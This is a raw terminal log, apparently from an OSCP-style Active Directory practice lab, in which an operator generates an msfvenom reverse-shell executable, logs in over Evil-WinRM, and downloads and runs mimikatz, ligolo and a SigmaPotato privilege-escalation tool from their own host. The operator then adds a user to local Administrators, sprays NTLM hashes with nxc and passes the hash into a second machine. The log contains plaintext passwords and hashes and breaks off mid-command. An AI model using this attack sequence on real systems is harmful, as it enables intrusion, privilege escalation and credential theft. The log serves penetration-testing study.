@@ -1,0 +1,1703 @@
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m cd PG/OSCP_A/A
+AD/   Aero/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~[0m]
+└─[1m[34m$[0m cd PG/OSCP_A/AD/Loot/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m msfvenom -p windows/x64/shell_r^Cerse_tcp LHOST=192.168.45.205 LPORT=8001 -f exe -o Tools/privesc.exe
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m evil-winrm -i 192.168.232.141 -u eric.wallows -p EricLikesRunning800
+[34mEvil-WinRM shell v3.9[39m
+[1m[33mWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_
+proc' for module Reline[0m
+[35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-pat
+h-completion[39m
+[34mInfo: Establishing connection to remote endpoint[39m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows\Documents>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows\Documents> cd ../
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> curl 192.168.45.205/ligolo.exe -o ligolo.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> curl 192.168.45.205/shell.exe -o shell.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> ./shell.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> exit
+[34mInfo: Exiting with code 0[39m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m ls
+hashes.txt  ips.txt  MS01_mimikatz  MS01_tickets  passwords.txt  [1m[32msam.hive[0m  secrets.dump  [1m[32msystem.hive[0m  use
+rs.txt
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m nxc winrm 10.10.192.141 -u users.txt -H hashes.txt
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[34m[*][0m Windows 10 / Server 2019 Build 19041 (name:MS01)
+(domain:oscp.exam)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Eric.Wallows:0d94b937ef3562f185262da2d6
+494e65
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\celia.almeda:0d94b937ef3562f185262da2d6
+494e65
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Mary.Williams:0d94b937ef3562f185262da2d
+6494e65
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Eric.Wallows:6054fa3677890f534b48659dc3
+b98764
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\celia.almeda:6054fa3677890f534b48659dc3
+b98764
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Mary.Williams:6054fa3677890f534b48659dc
+3b98764
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Eric.Wallows:9a3121977ee93af56ebd0ef4f5
+27a35e
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\celia.almeda:9a3121977ee93af56ebd0ef4f5
+27a35e
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Mary.Williams:9a3121977ee93af56ebd0ef4f
+527a35e
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Eric.Wallows:e728ecbadfb02f51ce8eed753f
+3ff3fd
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f
+3ff3fd
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Mary.Williams:e728ecbadfb02f51ce8eed753
+f3ff3fd
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m evil-winrm -i 192.168.232.141 -u eric.wallows -p EricLikesRunning800
+[34mEvil-WinRM shell v3.9[39m
+[1m[33mWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_
+proc' for module Reline[0m
+[35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-pat
+h-completion[39m
+[34mInfo: Establishing connection to remote endpoint[39m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows\Documents> cd ../
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> curl 192.168.45.205/mimikatz.exe -o mimikatz.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> curl 192.168.45.205/foothold.exe -o foothold.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> .\foothold.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> curl 192.168.45.205/SigmaPotato.exe -o sigma.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> .\sigma.exe ".\foothold.exe"
+[+] Starting Pipe Server...
+[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
+[+] Pipe Connected!
+[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
+[+] Searching for System Token...
+[+] PID: 924 | Token: 0x620 | User: NT AUTHORITY\SYSTEM
+[+] Found System Token: True
+[+] Duplicating Token...
+[+] New Token Handle: 1016
+[+] Current Command Length: 14 characters
+[+] Creating Process via 'CreateProcessWithTokenW'
+[+] Process Started with PID: 2124
+[+] Process returned no output.
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> .\sigma.exe "net localgroup Administrators eric.wallows /add"
+[+] Starting Pipe Server...
+[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
+[+] Pipe Connected!
+[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
+[+] Searching for System Token...
+[+] PID: 924 | Token: 0x620 | User: NT AUTHORITY\SYSTEM
+[+] Found System Token: True
+[+] Duplicating Token...
+[+] New Token Handle: 980
+[+] Current Command Length: 47 characters
+[+] Creating Process via 'CreateProcessWithTokenW'
+[+] Process Started with PID: 4504
+[+] Process Output:
+The command completed successfully.
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> .\foothold.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> exit
+[34mInfo: Exiting with code 0[39m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m evil-winrm -i 192.168.232.141 -u eric.wallows -p EricLikesRunning800
+[34mEvil-WinRM shell v3.9[39m
+[1m[33mWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_
+proc' for module Reline[0m
+[35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-pat
+h-completion[39m
+[34mInfo: Establishing connection to remote endpoint[39m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows\Documents> cd ../
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> .\foothold.exe
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\eric.wallows> exit
+[34mInfo: Exiting with code 0[39m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m nxc winrm 10.10.192.141 -u users.txt -H hashes.txt
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[34m[*][0m Windows 10 / Server 2019 Build 19041 (name:MS01)
+(domain:oscp.exam)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Eric.Wallows:0d94b937ef3562f185262da2d6
+494e65
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\celia.almeda:0d94b937ef3562f185262da2d6
+494e65
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Mary.Williams:0d94b937ef3562f185262da2d
+6494e65
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Eric.Wallows:9a3121977ee93af56ebd0ef4f5
+27a35e
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\celia.almeda:9a3121977ee93af56ebd0ef4f5
+27a35e
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Mary.Williams:9a3121977ee93af56ebd0ef4f
+527a35e
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Eric.Wallows:d0802ed64f9e0159034844f6b1
+38f7df
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\celia.almeda:d0802ed64f9e0159034844f6b1
+38f7df
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Mary.Williams:d0802ed64f9e0159034844f6b
+138f7df
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Eric.Wallows:e728ecbadfb02f51ce8eed753f
+3ff3fd
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f
+3ff3fd
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.141   5985   MS01             [1m[31m[-][0m oscp.exam\Mary.Williams:e728ecbadfb02f51ce8eed753
+f3ff3fd
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m vim hashes.txt
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m nxc winrm 10.10.192.142 -u users.txt -H hashes.txt
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[34m[*][0m Windows 10 / Server 2019 Build 19041 (name:MS02)
+(domain:oscp.exam)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[31m[-][0m oscp.exam\Eric.Wallows:0d94b937ef3562f185262da2d6
+494e65
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[31m[-][0m oscp.exam\celia.almeda:0d94b937ef3562f185262da2d6
+494e65
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[31m[-][0m oscp.exam\Mary.Williams:0d94b937ef3562f185262da2d
+6494e65
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[31m[-][0m oscp.exam\Eric.Wallows:9a3121977ee93af56ebd0ef4f5
+27a35e
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[31m[-][0m oscp.exam\celia.almeda:9a3121977ee93af56ebd0ef4f5
+27a35e
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[31m[-][0m oscp.exam\Mary.Williams:9a3121977ee93af56ebd0ef4f
+527a35e
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[31m[-][0m oscp.exam\Eric.Wallows:d0802ed64f9e0159034844f6b1
+38f7df
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[31m[-][0m oscp.exam\celia.almeda:d0802ed64f9e0159034844f6b1
+38f7df
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[31m[-][0m oscp.exam\Mary.Williams:d0802ed64f9e0159034844f6b
+138f7df
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[31m[-][0m oscp.exam\Eric.Wallows:e728ecbadfb02f51ce8eed753f
+3ff3fd
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has be
+en moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.ha
+zmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.192.142   5985   MS02             [1m[32m[+][0m oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f
+3ff3fd [1m[33m(Pwn3d!)[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m evil-winrm -i 192.168.232.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
+[34mEvil-WinRM shell v3.9[39m
+[1m[33mWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_
+proc' for module Reline[0m
+[35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-pat
+h-completion[39m
+[34mInfo: Establishing connection to remote endpoint[39m
+^C
+[1m[33mWarning: Press "y" to exit, press any other key to continue[0m
+[34mInfo: Exiting...[39m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m evil-winrm -i 10.10.192.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
+[34mEvil-WinRM shell v3.9[39m
+[1m[33mWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_
+proc' for module Reline[0m
+[35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-pat
+h-completion[39m
+[34mInfo: Establishing connection to remote endpoint[39m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda\Documents>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda\Documents> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                          State
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda\Documents> dir
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda\Documents> dir ..\Desktop
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda\Documents>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda\Documents> cd ..\
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> curl 192.168.45.205/foothold.exe -o shell.exe
+^C
+[1m[33mWarning: Press "y" to exit, press any other key to continue[0m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> ping 192.168.45.205
+Pinging 192.168.45.205 with 32 bytes of data:
+Reply from 10.10.192.142: Destination host unreachable.
+Reply from 10.10.192.142: Destination host unreachable.
+^C
+[1m[33mWarning: Press "y" to exit, press any other key to continue[0m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> cd C:\
+[31m*Evil-WinRM*[1m[33m PS [0mC:\> dir
+    Directory: C:\
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         12/7/2019   1:14 AM                PerfLogs
+d-r---        12/19/2022  11:34 PM                Program Files
+d-r---        11/10/2022   2:52 AM                Program Files (x86)
+d-r---        11/14/2022   6:32 AM                Users
+d-----        12/19/2022  11:38 PM                Windows
+d-----          4/4/2022   6:00 AM                windows.old
+-a----         3/28/2026   7:41 AM           2658 output.txt
+[31m*Evil-WinRM*[1m[33m PS [0mC:\> cd windows.old
+[31m*Evil-WinRM*[1m[33m PS [0mC:\windows.old> dir
+    Directory: C:\windows.old
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         3/23/2022   3:01 PM                PerfLogs
+d-----          4/4/2022   6:19 AM                Program Files
+d-----          4/4/2022   6:20 AM                Program Files (x86)
+d-----         3/23/2022   3:01 PM                Recovery
+d-----         3/23/2022   3:01 PM                Users
+d-----          4/4/2022   6:02 AM                Windows
+[31m*Evil-WinRM*[1m[33m PS [0mC:\windows.old> dir Users
+[31m*Evil-WinRM*[1m[33m PS [0mC:\windows.old> dir Recovery
+[31m*Evil-WinRM*[1m[33m PS [0mC:\windows.old>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\windows.old> ping 192.168.45.205
+Pinging 192.168.45.205 with 32 bytes of data:
+Reply from 10.10.192.142: Destination host unreachable.
+Reply from 10.10.192.142: Destination host unreachable.
+sReply from 10.10.192.142: Destination host unreachable.
+Reply from 10.10.192.142: Destination host unreachable.
+Ping statistics for 192.168.45.205:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+[31m*Evil-WinRM*[1m[33m PS [0mC:\windows.old> curl 10.10.192.141:9000
+The response content cannot be parsed because the Internet Explorer engine is not available, or Internet
+Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try agai
+n.
+At line:1 char:1
++ curl 10.10.192.141:9000
++ ~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+    + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWeb
+RequestCommand
+[31m*Evil-WinRM*[1m[33m PS [0mC:\windows.old> cd C:\Users\
